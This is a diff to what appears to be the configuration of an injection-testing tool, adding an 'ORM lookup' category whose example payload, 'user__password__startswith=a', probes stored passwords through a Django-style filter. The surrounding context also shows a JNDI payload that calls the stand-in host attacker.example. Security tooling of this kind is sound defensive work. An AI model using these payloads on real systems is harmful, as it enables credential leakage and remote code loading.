@@ -22,6 +22,7 @@ export const LANG_GROUPS: LangGroup[] = [
       { value: "ldap", label: "LDAP" },
       { value: "nosql", label: "NoSQL" },
       { value: "graphql", label: "GraphQL" },
+      { value: "orm", label: "ORM lookup" },
       { value: "el", label: "EL / JNDI" },
       { value: "code", label: "Code (eval)" },
       { value: "argument", label: "Argument / option" },
@@ -91,6 +92,7 @@ export const DIALECTS: Record<Lang, string[]> = {
   xml: [],
   yaml: [],
   graphql: [],
+  orm: [],
   el: [],
   csv: [],
   ssi: [],
@@ -156,6 +158,10 @@ export const EXAMPLES: Record<Lang, Example> = {
   el: {
     template: "[INFO] user={INPUT}",
     payload: "${jndi:ldap://attacker.example/a}",
+  },
+  orm: {
+    template: "User.objects.filter({INPUT})",
+    payload: "user__password__startswith=a",
   },
   csv: {
     template: "name,{INPUT},email",
@@ -244,6 +250,7 @@ export const supportsMutation = (lang: Lang): boolean =>
   lang === "xml" ||
   lang === "yaml" ||
   lang === "graphql" ||
+  lang === "orm" ||
   lang === "el" ||
   lang === "csv" ||
   lang === "ssi" ||
